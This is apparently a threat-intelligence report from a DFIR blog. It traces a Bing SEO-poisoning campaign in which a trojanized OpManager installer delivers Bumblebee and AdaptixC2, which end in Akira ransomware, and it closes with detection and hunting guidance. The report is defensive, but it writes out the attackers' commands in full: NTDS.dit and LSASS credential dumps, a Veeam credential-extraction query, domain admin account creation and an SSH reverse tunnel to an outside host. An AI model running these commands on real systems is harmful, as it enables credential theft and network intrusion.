			<h1 class="entry-title">From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira</h1>
		<div class="entry-meta">
			<span class="posted-on"><a href="https://thedfirreport.com/2025/08/05/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira/" rel="bookmark"><time class="entry-date published" datetime="2025-08-05T12:00:57+00:00">August 5, 2025</time></a></span>		</div><!-- .entry-meta -->

<h2 class="wp-block-heading">Overview</h2>



<p><a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.bumblebee" target="_blank" rel="noreferrer noopener">Bumblebee malware</a> has been an initial access tool used by threat actors since late 2021. In 2023 the malware was first reported as using <a href="https://www.secureworks.com/blog/bumblebee-malware-distributed-via-trojanized-installer-downloads" target="_blank" rel="noreferrer noopener">SEO poisoning</a> as a delivery mechanism. Recently in May of 2025 <a href="https://www.cyjax.com/resources/blog/a-sting-on-bing-bumblebee-delivered-through-bing-seo-poisoning-campaign/" target="_blank" rel="noreferrer noopener">Cyjax reported</a> on a campaign using this method again, impersonating various IT tools. We observed a similar campaign in July in which a download of an IT management tool ended with Akira ransomware.<span id="more-46068"></span></p>



<p>In July 2025, we observed a threat actor compromise an organization through this SEO poisoning campaign. A user searching for &#8220;ManageEngine OpManager&#8221; was directed to a malicious website, which delivered a trojanized software installer. This action led to the deployment of the Bumblebee malware, granting the threat actor initial access to the environment. The intrusion quickly escalated from a single infected host to a full-scale network compromise.</p>



<p>Following initial access, the threat actor moved laterally to a domain controller, dumped credentials, installed persistent remote access tools, and exfiltrated data using an SFTP client. The intrusion culminated in the deployment of Akira ransomware across the root domain. The threat actor returned two days later to repeat the process, encrypting systems within a child domain and causing significant operational disruption across the enterprise.</p>



<p>This campaign affected multiple organizations during July as we received confirmation of a similar intrusion responded to by the <a href="https://www.swisscom.ch/de/business/enterprise/angebot/security/threat-detection-and-response/csirt-as-a-service-and-rapid-response.html" target="_blank" rel="noreferrer noopener">Swisscom B2B CSIRT</a> in which a malicious IT tool dropped Bumblebee and also ended with Akira ransomware deployment.</p>

If you are interested in the full report or additional IOCs please contact us.</p>

<p><a href="https://pt.thedfirreport.com/contact/" target="_blank" rel="noreferrer noopener">Contact us</a> today for pricing or a demo!</p>



<h2 class="wp-block-heading">Intrusion Details</h2>



<p>This intrusion began when a user, searching for &#8220;ManageEngine OpManager&#8221; on Bing, was directed to the malicious site opmanager[.]pro.</p>
<p><a href="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/08/36726_fa_001.png?ssl=1"><img data-recalc-dims="1" fetchpriority="high" decoding="async" class="aligncenter size-full wp-image-46073" src="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/08/36726_fa_001.png?resize=1170%2C654&#038;ssl=1" alt="" width="1170" height="654" srcset="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/08/36726_fa_001.png?w=1264&amp;ssl=1 1264w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/08/36726_fa_001.png?resize=300%2C168&amp;ssl=1 300w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/08/36726_fa_001.png?resize=1024%2C573&amp;ssl=1 1024w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/08/36726_fa_001.png?resize=768%2C430&amp;ssl=1 768w" sizes="(max-width: 1170px) 100vw, 1170px" /></a></p>
<p><a href="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/08/36726_fa_002.png?ssl=1"><img data-recalc-dims="1" decoding="async" class="aligncenter size-full wp-image-46074" src="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/08/36726_fa_002.png?resize=1170%2C600&#038;ssl=1" alt="" width="1170" height="600" srcset="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/08/36726_fa_002.png?w=1264&amp;ssl=1 1264w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/08/36726_fa_002.png?resize=300%2C154&amp;ssl=1 300w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/08/36726_fa_002.png?resize=1024%2C525&amp;ssl=1 1024w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/08/36726_fa_002.png?resize=768%2C394&amp;ssl=1 768w" sizes="(max-width: 1170px) 100vw, 1170px" /></a></p>
<p>The user downloaded a trojanized MSI installer, ManageEngine-OpManager.msi, which, upon execution, installed the legitimate software while simultaneously loading the Bumblebee malware msimg32.dll via consent.exe.</p>
<p><a href="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/08/36726_fa_003.png?ssl=1"><img data-recalc-dims="1" decoding="async" class="aligncenter size-full wp-image-46075" src="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/08/36726_fa_003.png?resize=748%2C335&#038;ssl=1" alt="" width="748" height="335" srcset="https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/08/36726_fa_003.png?w=748&amp;ssl=1 748w, https://i0.wp.com/thedfirreport.com/wp-content/uploads/2025/08/36726_fa_003.png?resize=300%2C134&amp;ssl=1 300w" sizes="(max-width: 748px) 100vw, 748px" /></a></p>
<p>The Bumblebee malware established command and control (C2) with 109.205.195[.]211:443 and 188.40.187[.]145:443 using DGA domains.</p>













<p>By targeting IT management tools and software in both our intrusion and the one observed by <a href="https://www.swisscom.ch/de/business/enterprise/angebot/security/threat-detection-and-response/csirt-as-a-service-and-rapid-response.html" target="_blank" rel="noreferrer noopener">Swisscom B2B CSIRT</a>, the users executing the malware were highly privileged IT administrator accounts within Active Directory. This provided easy privileged access to the threat actors for their next actions.</p>



<p>Approximately five hours after this initial execution, Bumblebee deployed an <a href="https://github.com/Adaptix-Framework/AdaptixC2" target="_blank" rel="noreferrer noopener">AdaptixC2</a> beacon (AdgNsy.exe), which established a new C2 channel to 172.96.137[.]160:443. The threat actor then initiated internal reconnaissance using built-in Windows utilities, including systeminfo, nltest /dclist:, whoami /groups, and net group domain admins /dom.</p>



<p>Following this, the threat actor then created two new domain accounts, backup_DA and backup_EA, and added the latter to the &#8220;Enterprise Administrators&#8221; group. Using the privileged backup_EA account, the threat actor connected to a domain controller via RDP and dumped the NTDS.dit file using wbadmin.exe.</p>



<pre class="wp-block-preformatted">wbadmin.exe start backup -backuptarget:\\127.0.0.1\C$\ProgramData\ -include":C:\windows\NTDS\ntds.dit,C:\windows\system32\config\SYSTEM,C:\windows\system32\config\SECURITY" -quiet
</pre>



<p>For persistence and re-entry, the threat actor installed the RustDesk remote access tool on several hosts. In a subsequent session, the threat actor established a SSH tunnel to an external server at 193.242.184[.]150 to proxy their activity.</p>



<pre class="wp-block-preformatted">ssh <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7e0c11110a3e4f474d504c4a4c504f464a504f4b4e">[email&#160;protected]</a> -R *:10400 -p22
</pre>



<p>They continued discovery by deploying a renamed <a href="https://www.softperfect.com/products/networkscanner/" target="_blank" rel="noreferrer noopener">SoftPerfect network scanner</a> (n.exe). Following this, they targeted a backup server, and attempted to dump credentials from the Veeam PostgreSQL database.</p>



<pre class="wp-block-preformatted">psql.exe -U postgres --csv -d VeeamBackup -w -c "SELECT user_name,password,description,change_time_utc FROM credentials"
</pre>



<p>Around the same time, the threat actor installed FileZilla on a file server and exfiltrated data via SFTP to 185.174.100[.]203.</p>



<p>They performed LSASS memory dumping on multiple workstations using rundll32.exe with comsvcs.dll using a combination of remote services and WMI. The threat actor then deployed the Akira ransomware payload, locker.exe, and executed it with various command-line options to encrypt local, remote network shares, and other directories on remote hosts.</p>



<p>Two days after this first ransomware deployment, the threat actor returned via RustDesk, connected to a child domain controller, and performed another round of discovery using Invoke-ShareFinder and DNS zone export commands, before deploying Akira ransomware to the child domain.</p>



<p>Time to the first round of ransomware (TTR) was just shy of 44 hours after initial access. <a href="https://www.swisscom.ch/de/business/enterprise/angebot/security/threat-detection-and-response/csirt-as-a-service-and-rapid-response.html" target="_blank" rel="noreferrer noopener">Swisscom B2B CSIRT</a> reported an even faster TTR of just nine hours from initial access.</p>
<p data-start="370" data-end="652">During our investigation of the OpManager site, we identified two additional websites that appear to be distributing trojanized installers for Axis Camera tools and Angry IP Scanner. Refer to the IOC section for further details.</p>



<h2 class="wp-block-heading">Detection Engineering and Threat Hunting (DEATH)</h2>



<h3 class="wp-block-heading"><strong>Initial Access &amp; Execution</strong></h3>



<ul class="wp-block-list">
<li><strong>Hunt for MSI installations from user directories followed by suspicious child processes</strong>: Monitor msiexec.exe executing from user Desktop/Downloads (C:\Users\*\Desktop\*.msi, C:\ProgramData\*.msi) and spawning unexpected children like consent.exe or unusual image load events for msimg32.dll.</li>



<li><strong>Review unusual MSI packages with suspicious names</strong>: Look for MSI files with generic names like ManageEngine-OpManager.msi or rustdesk-*.msi downloaded to user directories. Is this software generally allowed in you environment? Is this a commonly used remote access tool for your users? Does the software being installed make sense for the users job role?</li>
</ul>



<h3 class="wp-block-heading"><strong>Credential Access</strong></h3>



<ul class="wp-block-list">
<li><strong>Hunt for LSASS memory dumping via comsvcs.dll with tasklist enumeration</strong>:</li>
</ul>



<pre class="wp-block-preformatted">cmd.exe /Q /c for /f "tokens=1,2 delims= " %%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do rundll32.exe C:\windows\System32\comsvcs.dll, #+000024 %%B \Windows\Temp\*.* full
</pre>



<ul class="wp-block-list">
<li><strong>Detect LSASS dumps with unusual file extensions</strong>: Monitor rundll32.exe comsvcs.dll #+000024 writing to \Windows\Temp\ with non-standard extensions like .sys, .docx, .avhdx</li>



<li><strong>Monitor PostgreSQL credential extraction from Veeam databases</strong>:</li>
</ul>



<pre class="wp-block-preformatted">psql.exe -U postgres --csv -d VeeamBackup -w -c "SELECT user_name,password,description,change_time_utc FROM credentials"</pre>
<ul class="wp-block-list">
<li><strong>Monitor wbadmin abuse for NTDS.dit/Hive dumping</strong>:</li>
</ul>
<p><!-- /wp:post-content -->

<!-- wp:preformatted --></p>
<pre class="wp-block-preformatted">wbadmin start backup -backuptarget:\\127.0.0.1\C$\ProgramData\ -include:"C:\windows\NTDS\ntds.dit,C:\windows\system32\config\SYSTEM,C:\windows\system32\config\SECURITY" -quiet</pre>
<!-- /wp:preformatted -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><strong>Discovery</strong></h3>
<!-- /wp:heading -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Hunt for rapid domain enumeration sequences within short time-frames</strong> (&lt; 5 minutes):</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">cmd.exe
├── systeminfo.exe
├── nltest.exe /dclist:
├── nltest.exe /domain_trusts
├── whoami.exe /groups
├── net.exe group "domain admins" /dom
└── net.exe group "enterprise admins" /dom
</pre>
<!-- /wp:preformatted -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Monitor for DNS zone exports targeting multiple domains</strong>: Look for Export-DnsServerZone commands targeting _msdcs.*, and TrustAnchors within the same session</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><strong>Persistence &amp; Privilege Escalation</strong></h3>
<!-- /wp:heading -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Detect domain user creation followed by immediate privilege escalation via net utility commands</strong>:</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">net user backup_EA P@ssw0rd1234 /add /dom
net group "enterprise admins" backup_EA /add /dom
</pre>
<!-- /wp:preformatted -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Hunt for backup account creation with predictable naming patterns</strong>: Monitor net user backup_* or backup_EA/backup_DA account creation followed by admin group additions</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><strong>Command &amp; Control</strong></h3>
<!-- /wp:heading -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Monitor for SSH reverse tunneling to external IPs</strong>:</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">ssh root@&lt;external_ip&gt; -R *:10400 -p22
</pre>
<!-- /wp:preformatted -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Hunt for Bumblebee DGA patterns</strong>: Look for multiple DNS queries to domains matching pattern [8-14 random chars].org (e.g., ev2sirbd269o5j[.]org, ijt0l3i8brit6q[.]org) within seconds of each other.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><strong>Lateral Movement</strong></h3>
<!-- /wp:heading -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Hunt for RDP logons using newly created accounts</strong>: Monitor Type 10 logons from compromised internal systems using accounts like backup_EA</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Detect suspicious inter-system authentication patterns</strong>: Look for authentication from initial access systems to domain controllers within hours of account creation</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><strong>Data Collection &amp; Exfiltration</strong></h3>
<!-- /wp:heading -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item --></ul>
<!-- /wp:list-item -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Hunt for FileZilla installation on servers followed by large outbound transfers</strong>: Detect FileZilla_*_setup.exe execution on server systems, especially when followed by significant network traffic</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Look for data staging in ProgramData</strong>: Monitor file writes to C:\ProgramData\shares.txt, C:\ProgramData\*.txt containing reconnaissance output</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><strong>Defense Evasion</strong></h3>
<!-- /wp:heading -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Detect case variation in command execution</strong>: Hunt for mixed-case command invocations like Cmd.eXE, CmD.Exe which may indicate evasion attempts</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><strong>Behavioral Correlation Rules</strong></h3>
<!-- /wp:heading -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Multi-stage attack progression</strong>: Alert when a single system exhibits: MSI installation → discovery commands → credential access → lateral movement within 24 hours</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Cross-system activity correlation</strong>: Hunt for accounts created on one system and immediately used for authentication on another (&lt;= 5mins)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Tool deployment patterns</strong>: Monitor for remote access tool installation (RustDesk) followed by SSH tunneling activity from the same network segment</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->
